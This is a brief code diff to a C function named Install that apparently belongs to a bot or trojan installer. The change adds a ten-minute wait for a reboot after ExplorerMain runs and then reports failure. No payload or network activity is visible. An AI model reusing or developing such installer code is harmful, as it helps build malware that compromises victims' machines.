@@ -1000,7 +1000,13 @@ extern"C"  BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 		
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("101_d"));
 
-		return ExplorerMain( bodyBotPlug, sizeBotPlug );
+		BOOL res = ExplorerMain( bodyBotPlug, sizeBotPlug );
+		if( res )
+		{
+			pSleep( 10 * 60 * 1000 ); //ждем перезагрузки
+			res = FALSE; //перезагрузка не произошла
+		}
+		return res;
 	}
 	return FALSE;
 }
